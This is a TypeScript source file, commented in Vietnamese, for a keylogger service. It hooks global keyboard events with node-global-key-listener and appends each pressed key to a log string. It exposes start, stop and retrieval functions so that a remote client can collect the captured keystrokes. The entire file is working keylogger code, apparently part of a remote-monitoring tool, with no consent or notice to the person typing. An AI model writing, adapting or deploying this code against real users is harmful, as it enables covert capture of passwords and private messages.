// file: src/services/keylogService.ts
import { GlobalKeyboardListener, IGlobalKeyEvent } from 'node-global-key-listener';

let listener: GlobalKeyboardListener | null = null;
let recordedLogs: string = ""; // Biến để lưu trữ log

/**
 * Hàm này được gọi khi Client bấm "Start Logging"
 */
export async function startKeylogHook() {
    if (listener) {
        return { status: "warn", message: "Keylogger đã chạy rồi." };
    }

    recordedLogs = ""; // Xóa log cũ mỗi khi Bắt đầu
    listener = new GlobalKeyboardListener();

    // Đăng ký hàm lắng nghe sự kiện phím
    listener.addListener((e: IGlobalKeyEvent, down: any) => {
        // Chỉ bắt sự kiện khi phím được NHẤN XUỐNG
        if (e.state === "DOWN") {

            // Chuyển đổi tên phím thành chuỗi dễ đọc
            let key = e.name || 'UNKNOWN';
            if (key === 'SPACE') key = ' ';
            if (key === 'RETURN') key = '[Enter]\n';
            if (key === 'TAB') key = '[Tab]';
            // ... (bạn có thể thêm các phím đặc biệt khác)

            // Chỉ ghi lại các phím đơn giản (a, b, c...) hoặc phím đặc biệt (Enter, Tab)
            if (key.length === 1) { 
                recordedLogs += key;
            } else if (key.startsWith('[')) { // Ghi lại phím đặc biệt
                recordedLogs += key;
            }
        }
    });

    console.log("[Keylog Service] Đã HOOK");
    return { status: "ok", message: "Đã bắt đầu theo dõi phím bấm." };
}

/**
 * Hàm này được gọi khi Client bấm "Stop Logging"
 */
export async function stopKeylogHook() {
    if (listener) {
        listener.kill(); // Dừng và hủy listener
        listener = null;
        console.log("[Keylog Service] Đã UNHOOK");
        return { status: "ok", message: "Đã dừng theo dõi." };
    }
    return { status: "warn", message: "Keylogger chưa chạy." };
}

/**
 * Hàm này được gọi khi Client bấm "Làm mới Logs" (Print)
 */
export async function getKeylogPrint() {
    // Trả về toàn bộ chuỗi log đã ghi được
    // Client sẽ nhận được chuỗi này trong 'response.payload'
    return recordedLogs;
}